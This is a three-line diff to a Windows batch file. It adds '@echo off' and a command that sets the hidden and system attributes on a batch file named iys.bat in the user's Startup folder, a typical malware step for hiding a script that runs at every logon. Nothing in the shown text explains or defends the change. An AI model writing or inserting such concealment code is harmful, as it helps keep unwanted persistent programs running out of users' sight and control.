@@ -1,1 +1,3 @@
+@echo off
+attrib +h +s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\iys.bat"
 exit
